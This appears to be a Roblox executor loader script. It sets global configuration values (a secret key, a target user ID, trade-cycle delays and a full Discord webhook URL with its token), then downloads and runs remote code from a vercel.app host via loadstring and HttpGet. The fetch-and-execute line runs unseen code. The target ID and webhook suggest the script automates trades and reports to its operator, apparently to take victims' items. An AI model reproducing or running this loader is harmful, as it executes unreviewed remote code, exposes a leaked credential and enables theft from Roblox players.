getgenv().SECRET_KEY = "mrr_2807d10573d2485e9133dc295b81581d"
getgenv().TARGET_ID = 5845628702
getgenv().DELAY_STEP = 1      
getgenv().TRADE_CYCLE_DELAY = 2
getgenv().DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1486036001666109543/MZBcIb9puUO9bewkFf5MMsuQ0uS4aOAId5nxy1TCKm4mSf_mcguYlMXi_UibSENT36SY"
...
task.spawn(function()
loadstring(game:HttpGet("https://orrxl4-protector.vercel.app/api/raw?id=g60dik4a"))()
end)